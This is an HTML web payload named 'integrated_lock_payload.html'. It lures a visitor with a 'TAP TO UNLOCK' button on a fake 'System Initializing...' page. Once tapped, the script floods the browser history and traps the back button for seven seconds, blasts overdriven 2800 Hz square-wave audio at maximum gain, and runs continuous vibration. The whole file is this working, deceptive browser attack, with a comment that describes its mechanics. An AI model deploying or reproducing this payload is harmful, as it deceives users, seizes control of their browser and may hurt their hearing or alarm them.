<!-- language: HTML, file: integrated_lock_payload.html, target: Mobile/Desktop Browsers -->
<!-- 
  Execution Mechanics:
  1. Timed History Flood: Pushes 500 state entries to trap the back button and 
     intercept popstate events for an exact 7-second duration before auto-releasing.
  2. Max-Gain Audio Overdrive: Streams continuous high-frequency square waves 
     at a digital gain multiplier (5.0+) for maximum speaker volume and clipping.
  3. Haptic Saturation: Fires continuous heavy vibration patterns synchronized 
     with the active lock window.
-->

<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Initializing...</title>
</head>
<body style="background:#000; color:#ff0033; text-align:center; padding-top:40vh; font-family:monospace;">
    <button id="btn" style="padding:25px 40px; font-size:22px; background:#ff0033; color:#fff; border:none; font-weight:bold; border-radius:8px; cursor:pointer;">TAP TO UNLOCK</button>
    <script>
        document.getElementById('btn').addEventListener('click', function() {
            document.body.innerHTML = "<h1 style='color:#ff0033; font-size:32px;'>SYSTEM OVERLOAD</h1><p style='color:#fff;'>7-second navigation lock engaged.</p>";

            // 1. Flood History Stack & Lock Navigation
            for (let i = 0; i < 500; i++) {
                history.pushState({id: i}, "", "#lock" + i);
            }

            let locked = true;
            setTimeout(() => {
                locked = false;
                document.body.innerHTML = "<h1 style='color:#0f0;'>LOCK RELEASED</h1><p style='color:#fff;'>Normal operation restored.</p>";
            }, 7000); // 7-second auto-release window

            window.addEventListener('popstate', function(e) {
                if (locked) {
                    history.pushState({id: 'trap'}, "", "#trap");
                    if ("vibrate" in navigator) {
                        try { navigator.vibrate([1000, 50, 1000]); } catch(err) {}
                    }
                }
            });

            // 2. Maximum Amplitude Audio Overdrive
            const ctx = new (window.AudioContext || window.webkitAudioContext)();
            if (ctx.state === 'suspended') { ctx.resume(); }

            const audioInterval = setInterval(() => {
                if (!locked) {
                    clearInterval(audioInterval);
                    return;
                }
                try {
                    const osc = ctx.createOscillator();
                    const gain = ctx.createGain();

                    osc.type = 'square';
                    osc.frequency.setValueAtTime(2800, ctx.currentTime);
                    gain.gain.setValueAtTime(5.0, ctx.currentTime); // Max digital overload

                    osc.connect(gain);
                    gain.connect(ctx.destination);

                    osc.start();
                    osc.stop(ctx.currentTime + 0.15);
                } catch(e) {}
            }, 100);

            // 3. Continuous Haptic Saturation Loop
            if ("vibrate" in navigator) {
                const vibInterval = setInterval(() => {
                    if (!locked) {
                        clearInterval(vibInterval);
                        return;
                    }
                    try {
                        navigator.vibrate([1000, 50, 1000, 50, 1000]);
                    } catch(e) {}
                }, 1000);
            }
        });
    </script>
</body>
</html>
